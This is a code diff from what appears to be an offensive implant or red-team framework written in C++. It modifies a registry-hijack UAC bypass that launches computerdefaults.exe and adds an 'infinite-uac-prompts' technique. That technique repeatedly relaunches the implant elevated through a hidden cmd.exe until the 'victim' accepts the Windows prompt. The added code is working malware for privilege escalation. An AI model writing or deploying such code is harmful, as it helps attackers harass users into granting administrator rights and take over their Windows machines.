@@ -50,7 +50,7 @@ namespace Task
                 return L"Error: Failed to add registry value for DeletegateExecute.";
             }
 
-            // Start the fodhelper.exe
+            // Start the computerdefaults.exe
             SHELLEXECUTEINFO sei = {sizeof(sei)};
             sei.lpVerb = L"runas";
             sei.lpFile = L"C:\\Windows\\System32\\computerdefaults.exe";
@@ -159,6 +159,29 @@ namespace Task
             }
 
             return L"Success: The fodhelper and another process started successfully.";
+        }
+        else if (wcscmp(wTechnique.c_str(), L"infinite-uac-prompts") == 0)
+        {
+            // Reference: https://any.run/cybersecurity-blog/windows11-uac-bypass/
+            while (TRUE)
+            {
+                std::wstring wParams = L"/c " + std::wstring(wSelfPath) + L" && pause";
+
+                SHELLEXECUTEINFO sei = {sizeof(sei)};
+                sei.lpVerb = L"runas";
+                sei.lpFile = L"cmd.exe";
+                sei.lpParameters = wParams.c_str();
+                // sei.hwnd = nullptr;
+                sei.nShow = SW_HIDE;
+
+                if (pState->pProcs->lpShellExecuteExW(&sei))
+                {
+                    return L"Success: The inifinite UAC prompts is executed.";
+                }
+                // If the victim unaccept the UAC prompt, infinite loop until it's accepted...
+            }
+
+            return L"Success: The inifinite UAC prompts is executed.";
         }
 
         return L"Error: Invalid technique.";
